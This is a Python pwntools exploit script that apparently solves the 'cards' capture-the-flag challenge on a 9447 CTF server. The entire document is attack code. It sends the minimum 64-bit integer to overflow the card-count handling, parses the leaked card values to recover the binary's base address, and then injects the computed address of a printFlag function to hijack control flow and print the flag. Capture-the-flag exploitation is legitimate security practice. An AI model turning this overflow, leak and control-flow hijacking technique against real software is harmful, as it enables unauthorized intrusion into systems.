from pwn import *

context(arch="i386", os="linux")

HOST,PORT = "cards-6xvx9tsi.9447.plumbing", 9447
r = remote(HOST,PORT)
#r = process("./cards")

r.sendline("-9223372036854775808")
r.sendline("1\n")
r.sendline("2\n")
r.sendline("3\n")
r.sendline("4\n")
r.sendline("0\n")


r.recvuntil("Here are your cards left:\n")
vals = r.recvline().split(" ")[:-1]

for v in vals:
  if int(v) & 0xfff == 0x8ea:
    _start = int(v)
    break

base = _start - 0x08EA
printFlag = base + 0x0D90

for i in range(5):
  r.send(str(i)+"\n")

r.recvuntil("Enter up to 52 cards (0 to stop):")

r.sendline("-9223372036854775808")
r.sendline(str(printFlag)+"\n")
r.sendline("2\n")
r.sendline("3\n")
r.sendline("4\n")
r.sendline("5\n")
r.sendline("6\n")
r.sendline("0\n")

r.recvuntil("Have a flag:\n")
print r.recvline()
